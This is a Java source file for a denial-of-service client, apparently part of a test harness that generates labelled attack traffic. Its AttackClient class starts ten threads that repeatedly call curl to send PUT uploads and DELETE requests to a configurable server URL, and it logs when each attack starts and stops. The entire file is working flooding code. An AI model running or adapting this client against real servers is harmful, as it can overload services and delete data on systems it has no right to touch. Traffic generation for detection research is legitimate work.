package dos;

import java.io.IOException;
import java.util.Calendar;

public class AttackClient implements Runnable{

	private String server;
	private int port;
	private String uri;
	private static int delay;
	private static boolean stop;
	private int connections;
	private int serviceTime;
	private Thread[] attackers;

	public AttackClient(String server, int port, String uri) {
		this.server = server;
		this.port = port;
		this.uri = uri;
		AttackClient.delay = 500; // 500 millis
		AttackClient.stop = false;
		this.connections = 0;
		this.serviceTime = 0;
		attackers = new Thread[10];
	}

	public void run() {

		if(Math.random()<0.5){
			Logger.write("Start Attack. Time"+ Calendar.getInstance().getTime().toString());
			Logger.write("Creo treads:"+ attackers.length);
			for(int i=0;i<attackers.length;i++){
				Attacker a = new Attacker(server, port, uri, i);
				attackers[i] = new Thread(a);
				attackers[i].start();
			}
			try {
				Thread.sleep(Test.ATTACK_LENGHT);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			finally{
				AttackClient.stop = true;
				Logger.write("Stop Attack. Time"+ Calendar.getInstance().getTime().toString());
				Test.ATTACKER_VAR=0;
				try {
					Thread.sleep(Test.ATTACK_BETWEEN);
					Test.ATTACKER_VAR=1;
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}else{
			Test.ATTACKER_VAR=0;
		}
	}


public class Attacker implements Runnable{

	private String server;
	private int port, threadNum;
	private String uri;

	public Attacker(String server, int port, String uri, int threadNum) {
		this.server = server;
		this.port = port;
		this.uri = uri;
		this.threadNum = threadNum;
	}

	@Override
	public void run() {
		Logger.write("Thread name: "+threadNum+" --THREAD STARTED--");
		Integer index = Test.HASHMAPS.getFilesToPut().size()-1;
		String file = Test.HASHMAPS.getFilesToPut().get(index);
		String targetURL = this.server+":"+this.port+"/"+this.uri+"/"+file+"?atk="+Test.ATTACKER_VAR; //build the URL

		while(!AttackClient.stop)
		{
			try {
				Thread.sleep(AttackClient.delay);
				ProcessBuilder pb = new ProcessBuilder("curl", "--data", "@"+file, "--request", "PUT", targetURL);
				pb.redirectErrorStream(true);
				pb.start();

				ProcessBuilder pb2 = new ProcessBuilder("curl", "--request", "DELETE", targetURL);
				pb2.redirectErrorStream(true);
				pb2.start();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		Logger.write("Thread name: "+threadNum+" --THREAD DIED--");
		return;
	}
}

}
